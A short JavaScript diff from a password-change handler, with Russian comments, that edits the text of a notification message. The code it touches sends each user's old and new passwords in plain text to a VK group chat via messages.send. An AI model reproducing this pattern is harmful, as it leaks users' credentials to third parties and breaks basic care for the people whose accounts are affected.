@@ -84,7 +84,7 @@ $(".save-button").on("click tap", () => {
         sendGSRequest("usersPasswords", "getValueCompareById", {id: userData.id, value: oldPassword}, (data) => {
             if (data) { // Если старый пароль совпадает
                 sendGSRequest("usersPasswords", "updateValueById", {id: userData.id, value: newPassword}, (data) => {
-                    let message = `Смена пароля:\nПользователь: ${userData.name} ${userData.surname} (${userData.id})\nПароль: ${oldPassword} > ${newPassword}`
+                    let message = `Смена пароля:\nПользователь: ${userData.vkName} (${userData.id})\nПароль: ${oldPassword} > ${newPassword}`
                     sendVkRequest('messages.send', {peer_id: 2000000007, random_id: 0, message: message}, 
                         (data) => {
                             if (data.response) { // success
